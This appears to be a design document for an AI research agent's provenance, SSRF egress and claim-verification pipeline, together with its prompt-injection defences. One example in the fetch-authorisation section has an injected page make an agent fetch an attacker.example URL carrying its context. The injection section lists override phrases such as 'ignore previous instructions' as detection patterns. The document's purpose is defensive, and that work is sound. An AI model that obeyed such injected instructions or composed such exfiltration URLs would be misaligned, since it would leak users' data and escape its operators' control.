# Provenance, URL authorisation and verification

This is the part of the system that makes its output trustworthy. Contracts:
[`provenance.ts`](../packages/contracts/src/provenance.ts), [`claim.ts`](../packages/contracts/src/claim.ts).

## The chain

```
DiscoveredUrl   why the URL was allowed: search result, user input, page link, provider record
  → SourceSnapshot   what we saved: final URL, redirects, HTTP metadata, retrieval time, text, hashes, extraction method
    → Evidence       the exact quote, where it sits in the snapshot, grounding result, judge verdict
      → Claim        the typed assertion, its status, confidence and reasons
        → Finding    the analysis or score that relies on it
```

Every claim must reach a stored snapshot through this chain. Quotes are only ever checked against saved text,
never against a live page, so a verdict stays reproducible after the page changes.

## URL origins

| Origin | Recorded | Example |
|---|---|---|
| `search_result` | tool call, provider, query, rank | a funding article returned by `web_search` |
| `user_provided` | user id | a URL typed into the objective or project settings |
| `page_link` | the snapshot it was found on, anchor text | the team page linked from a company homepage |
| `provider_record` | tool call, provider, field | the official website on a Wikidata record |

A model can never introduce a URL. It can only choose among URLs that already have an origin in the current scope. `user_provided` origins come from the `seedUrls` of `createRun`: pages the user points the research at.

## Fetch authorisation

**Rule:** `fetch_page(url)` is allowed only if `normalize(url)` has a `DiscoveredUrl` row in the caller's scope
(the run, for app executions; the client session, for external MCP clients) **and** the URL passes the egress policy.

Why: a prompt-injected page can instruct an agent to fetch `https://attacker.example/?q=<everything in context>`.
Under this rule that URL has no origin, so the call fails with `URL_NOT_PERMITTED` and nothing leaves the system.
Static links on the attacker's page can be followed, but they can't carry data the model composed.

Normalisation (same function for recording and lookup): WHATWG URL parsing (non-transitional UTS #46, so `ß` is
not folded to `ss`), lowercase scheme and host, default ports removed, fragment removed, tracking parameters removed
(`utm_*`, `gclid`, `fbclid`, `mc_cid`, `mc_eid`), other query parameters kept in order.

A redirect from an authorised URL is followed without needing its own origin (the server, not the model, chose it),
but every hop passes the egress policy. The chain is stored in `http.redirectChain`.

## Egress policy (SSRF)

Enforced in one place: the MCP server's fetcher.

| Control | Rule |
|---|---|
| Scheme / port | `http`, `https` only; ports 80 and 443 only |
| DNS / IP | Resolve A and AAAA; reject if any address is loopback, private, link-local, CGNAT, multicast, reserved, documentation or metadata (e.g. `127.0.0.0/8`, `10.0.0.0/8`, `100.64.0.0/10`, `169.254.0.0/16`, `172.16.0.0/12`, `192.168.0.0/16`, `0.0.0.0/8`, `224.0.0.0/4`, `240.0.0.0/4`, `::1`, `fc00::/7`, `fe80::/10`; IPv4-mapped and NAT64 addresses are checked by their embedded IPv4) |
| Rebinding | Connect to the validated IP itself (pinned), with the original Host and SNI |
| Redirects | At most 5; each hop re-validated (scheme, port, DNS, IP) |
| Time | Connect 5 s, first byte 10 s, total 20 s |
| Size | 5 MB on the wire, 10 MB after decompression, streamed and cut off beyond |
| Content type | `text/html`, `application/xhtml+xml`, `text/plain` (PDF after the MVP) |
| Politeness | robots.txt honoured per RFC 9309 (4xx: allowed, 5xx: disallowed), cached 24 h; 1 request/s per host; identifying User-Agent with a contact URL |
| Domain controls | Global denylist (login-walled networks such as linkedin.com, x.com, facebook.com, instagram.com); per-workspace denylist; optional per-project allowlist mode |
| Proxies | Environment proxies ignored by the fetcher |

## Snapshots

Stored for every successful fetch: requested URL, final URL, canonical URL (informational only), host,
registrable domain, publisher, HTTP status, content type, ETag, Last-Modified, redirect chain, resolved IP,
retrieval time, SHA-256 of the raw bytes, SHA-256 of the normalised extracted text, the text itself (up to 400,000
characters, flagged if truncated), extraction method and version, title, language, and published date with the
method that found it (JSON-LD, meta tags, `<time>`, URL path, provider field, or none).

Registry and knowledge-base records from `lookup_company` and `find_company_people` are stored as snapshots too
(`extraction.method = provider_api`, a readable rendering of the record), so claims from providers follow the same
chain as claims from web pages.

Identical content at the same final URL maps to one snapshot (`unique (workspace, final_url_hash, content_sha256)`).
Raw HTML is not stored.

## Source tiers

| Tier | Meaning | Examples |
|---|---|---|
| A | Authoritative for what it states | Company registries; the company's own site and press releases, for self-reported facts only |
| B | Reputable editorial sources | A curated list of business and technology news outlets |
| C | Other web | Aggregators, directories, community-edited knowledge bases, blogs |
| D | User-generated | Forums, social posts |

Authority is attribute-relative: the company's own site is tier A for its funding announcement and team page,
not for claims about its competitors.

## Verification

Implemented in Phase 4: `packages/core/src/verification` (normalisation with an offset map, grounding, value-in-quote,
independence, policy v1, confidence, conflicts) and `packages/core/src/workflow/verify.ts`, which applies them in the
`verify_entity` completion transaction. Only the judge's verdict comes from a model.

Per claim, in order. Everything except step 3 is deterministic code.

1. **Schema:** the assertion parses; the attribute fits the subject.
2. **Grounding:** each cited quote must be found in its snapshot.
   - Normalise both texts: NFKC; dash and hyphen variants (U+2010 to U+2015, U+2212) → `-`; typographic quotes → ASCII;
     whitespace collapsed; invisible tag characters removed; case-folded for matching, with an offset map back to the original.
   - Strip quotation marks wrapping the whole quote.
   - `exact` if found verbatim; `normalized` if found after normalisation; `elided_segments` if the quote uses `...` or `…`
     and every segment (≥ 20 characters) appears in order within 1,500 characters; else `not_found` → claim `rejected`
     with `QUOTE_NOT_FOUND`.
   - Quotes shorter than 4 words are rejected (`QUOTE_TOO_SHORT`): "Tallinn" is a match, not evidence.
   - **Value in quote:** where the attribute has a detectable surface form (amounts, currencies, stages, dates, years,
     country and city names, person name with title), the value must appear in the quote or its immediate sentence,
     else `VALUE_NOT_IN_QUOTE`.

   These rules come from the 2026-09-30 compatibility test: gpt-oss-120b wrote "co‑founder" with a non-breaking hyphen
   (a naive check would have rejected a verbatim quote), and the Qwen models shortened quotes with "...".
3. **Judge:** the verifier model answers "does this quote support this claim?" for grounded quotes only.
4. **Policy:** per attribute, versioned (table below). Independence: different registrable domains **and** not
   near-duplicate text (5-word-shingle Jaccard ≥ 0.6 around the span counts as syndication, so twenty copies of one
   press release count once).
5. **Consistency:** a conflicting value for the same subject and attribute makes both claims `contested`.
6. **Entity resolution:** registrable domain, then registry identifiers, then normalised-name similarity (pg_trgm)
   within the same country.
7. **Criteria:** a claim that takes the company outside the brief (e.g. HQ outside the country list) excludes the
   company with `OUTSIDE_CRITERIA`.
8. **Coverage:** required attributes with no verified or probable claim become research gaps.

### Policy v1

| Attribute | Verified | Probable | Other rules |
|---|---|---|---|
| `company.funding_round` | 1 tier-A announcement, or 2 independent tier-B | 1 tier-B or C | Amounts differing > 5 % or dates > 14 days apart → contested; outside the funding window → outside criteria |
| `company.hq_country` | Registry record, or company site + 1 independent | 1 source | Different countries → contested |
| `company.website` | Registry or provider record, or self-reference on the site + 1 independent | 1 source | — |
| `company.sector` | 2 independent sources, or the company's own site | 1 source | Tags merged, not contested |
| `person.current_role` | Company team page retrieved this run, or active registry officer, or 2 independent sources ≤ 12 months | 1 source ≤ 12 months | Newest source > 18 months → stale; a different current title at the same company → contested |
| Others | 2 independent | 1 | — |

### Confidence (code only)

Base score by status: verified 0.80, probable 0.55, contested 0.35. Adjustments: +0.10 with a tier-A source; +0.05
per additional independent source (max +0.10); −0.10 if the newest source is older than 12 months; −0.10 if any
judge verdict is `partially_supports`; −0.20 if a supporting source is flagged `suspected_prompt_injection`. Clamped
to [0, 1]. Bands: ≥ 0.75 high, ≥ 0.50 medium, otherwise low. Every adjustment is written to `verification.reasons`,
so the UI can say why. Policy id and version are stored on the claim; changing the policy is a new version, and old
claims keep the policy they were judged under.

## Prompt injection

Web content is untrusted data. The defence is structural first:

1. **Capabilities, not instructions.** Roles that read web text have only read-only tools, a capability token
   scoped to one execution, and no secrets or other tenants' data in context. They cannot create tasks, approve,
   write rows or send anything.
2. **Provenance-bound fetching** stops model-composed URLs (above).
3. **Isolation of writers.** The analyst and outreach writer see only claim statements rendered by code from typed
   values, never page text.
4. **Everything a model returns is a proposal:** schema-validated, grounded against saved text, checked by policy.
   A model can't raise a claim's status.
5. **Humans approve anything outward.** The MVP never sends anything.

Signals on top: page text reaches models as JSON-encoded tool results; invisible Unicode tag characters and
zero-width runs are stripped before any model sees text; instruction-like patterns ("ignore previous instructions",
"system prompt", our tool names, role-play openers) flag the snapshot `suspected_prompt_injection`, which lowers
confidence and shows a warning next to every claim it supports. Heuristics are signals, not the defence.

## Retention

Snapshots and evidence are kept while the run exists. Deleting a person removes their claims, evidence rows and
findings that cite them (right to erasure). Model conversation logs (`agent_messages`) are pruned after a
configurable period (default 30 days); `llm_calls` metrics are kept.
